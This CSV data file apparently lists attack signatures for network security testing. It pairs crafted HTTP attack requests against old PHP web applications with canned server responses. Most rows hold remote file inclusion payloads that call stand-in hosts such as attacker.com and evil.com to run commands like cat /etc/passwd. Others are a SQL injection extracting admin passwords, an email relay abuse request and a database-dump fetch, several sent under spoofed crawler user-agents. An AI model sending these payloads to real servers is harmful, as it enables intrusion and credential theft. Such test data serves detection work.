XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
phpMyVisitesFileRead.xml,phpMyVisites Arbitrary File Reading,This threat takes advantage of a form submission that will set a cookie which allows an attacker to read an arbitrary file off of the system.  This allows the attacker to learn more about the system for further attacks or read sensitive information.  phpMyVisites is a PHP script which will typically run on a webserver listening on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿php_livehelper_rfi.xml,PHP Live Helper Global.PHP Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHP Live Helper is a web application that typically listens on port 80,HTTP,TCP,GET /global.php?abs_path=http||3A ||//attacker.com/cmd.txt?&cmd=cat+/etc/passwd HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
php_livehelper_rfi.xml,PHP Live Helper Global.PHP Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHP Live Helper is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿php_simpleshop_rfi.xml,TurnkeyWebTools PHP Simple Shop Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHP SimpleShop is a web application that typically listens on port 80,HTTP,TCP,GET /admin/login.php?abs_path=http||3A ||//attacker.com/inject.txt?&cmd=ls HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
php_simpleshop_rfi.xml,TurnkeyWebTools PHP Simple Shop Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PHP SimpleShop is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpartenaire_rfi.xml,PHPartenaire Dix.PHP3 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.PHPatenaire is a web application that typically listens on port 80.,HTTP,TCP,GET /dix.php3?url_phpartenaire=http||3A ||//attacker.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.victim.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpartenaire_rfi.xml,PHPartenaire Dix.PHP3 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.PHPatenaire is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpauction_rfi.xml,PHPAuction 2.1 (phpAds_path) Remote File Inclusion Vulnerability,,HTTP,TCP,GET /phpAdsNew/view.inc.php?phpAds_path=http||3A ||//evilsite.com/evil.php/&cmd=cat+/etc/passwd HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||Usger-Agent||3A || Scooter/3.3||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpauction_rfi.xml,PHPAuction 2.1 (phpAds_path) Remote File Inclusion Vulnerability,,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpay_mailforger.xml,"phPay Nu_mail.inc.PHP Open Email Relay Vulnerability
phPay Nu_mail.inc.PHP Open Email Relay Vulnerability",This email sends a crafted url that will allow forge and or send arbitrary unsolicited bulk email. phPay is a web application that typically listens on port 80.,HTTP,TCP,"GET /phpay/nu_mail.inc.php?mail_text2=hack&user_row[]=&user_row[5]=user@site.com&nu_mail_1=owned&shop_mail=webmaster@site.com HTTP/1.1||0D 0A ||TE||3A || deflate,gzip||3B ||q=0.3||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || libwww-perl/5.805||0D 0A ||Connection||3A || TE, close||0D 0A 0D 0A||"
phpay_mailforger.xml,"phPay Nu_mail.inc.PHP Open Email Relay Vulnerability
phPay Nu_mail.inc.PHP Open Email Relay Vulnerability",This email sends a crafted url that will allow forge and or send arbitrary unsolicited bulk email. phPay is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb2_modificat_rfi.xml,phpBB2 MODificat (phpbb_root_path) Remote File Include Vulnerability,"This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.
Phpbb2 MODificat is a web application that typically listens on port 80.",HTTP,TCP,GET /includes/functions.php?phpbb_root_path=http||3A ||//evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbb2_modificat_rfi.xml,phpBB2 MODificat (phpbb_root_path) Remote File Include Vulnerability,"This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.
Phpbb2 MODificat is a web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb_mutant_rfi.xml,phpBB mutant 0.9.2 (phpbb_root_path) Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpBB Mutant is a web application that typically listens on port 80.,HTTP,TCP,GET /mutant_includes/mutant_functions.php?phpbb_root_path=http||3A ||//evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbb_mutant_rfi.xml,phpBB mutant 0.9.2 (phpbb_root_path) Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpBB Mutant is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb_plusxl_rfi.xml,PHPBB PlusXL PHPBB_Root_Path Parameter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.PhpBB plusXL is a web application that typically listens on port 80.,HTTP,TCP,GET /mods/iai/includes/constants.php?phpbb_root_path=http||3A ||//attacker.com/cmd.txt? HTTP1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbb_plusxl_rfi.xml,PHPBB PlusXL PHPBB_Root_Path Parameter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.PhpBB plusXL is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb_tweaked_rfi.xml,Phpbb Tweaked (phpbb_root_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Phpbb Tweaked is a web application that typically listens on port 80.,HTTP,TCP,GET /includes/functions.php?phpbb_root_path=http||3A ||//evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbb_tweaked_rfi.xml,Phpbb Tweaked (phpbb_root_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Phpbb Tweaked is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbbxtra_rfi.xml,PhpbbXtra v2.0 (phpbb_root_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PhpbbXtra is a web application that typically listens on port 80.,HTTP,TCP,GET /includes/archive/archive_topic.php?phpbb_root_path=http||3A ||//evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbbxtra_rfi.xml,PhpbbXtra v2.0 (phpbb_root_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PhpbbXtra is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbluedragon_rfi.xml,PhpDragonCMS remote file include,This threat sends a crafted url that exploits a failing in the Template.PHP function which allows a malicious user to include commands in the context of the vulnerable web server.PhpDragonCMS is a web application that typically listens on port 80.,HTTP,TCP,GET /software_upload/public_includes/pub_templates/vphptree/template.php?vsDragonRootPath=http||3A ||//evilsite.com/cmd.txt/ HTTP/1.0||0D 0A ||Host||3A || www.victimsite.com||0D 0A ||User-Agent||3A || Googlebot/2.6||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpbluedragon_rfi.xml,PhpDragonCMS remote file include,This threat sends a crafted url that exploits a failing in the Template.PHP function which allows a malicious user to include commands in the context of the vulnerable web server.PhpDragonCMS is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpclassifieds_rfi.xml,PHP Classifieds CatID Parameter SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Php Classifieds is a web application that typically listens on port 80.,HTTP,TCP,"GET /index.php?catid=0 UNION SELECT concat(adm_name, space(1), adm_pass) AS adm_name, NULL FROM phpclass_admins HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || mnsbot/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||"
phpclassifieds_rfi.xml,PHP Classifieds CatID Parameter SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Php Classifieds is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpecard_rfi.xml,phpECard Remote File Inclusion Vulnerability,"This threat sends a crafted url to a web server, taking advantage of a flaw PSlash application software, thus allowing for commands to be executed on the affected server. PhpECard is a web application that typically listens on port 80.",HTTP,TCP,GET /phpEcard/functions.php?include_path=http||3A ||//www.evil.net/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpecard_rfi.xml,phpECard Remote File Inclusion Vulnerability,"This threat sends a crafted url to a web server, taking advantage of a flaw PSlash application software, thus allowing for commands to be executed on the affected server. PhpECard is a web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpfusion_dbdl.xml,PHPFusion Database Download,This threat attempts to download the stored database dump of PHPFusion.  This application stores a backup of the database in a predictable location with a predictable name.  PHPFusion is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpgneric_rfi.xml,PhP Generic (include_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Php Generic is a web application that typically listens on port 80,HTTP,TCP,GET /membres/membreManager.php?include_path=http||3A ||//evils.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || MSNBOT/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpgneric_rfi.xml,PhP Generic (include_path) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Php Generic is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
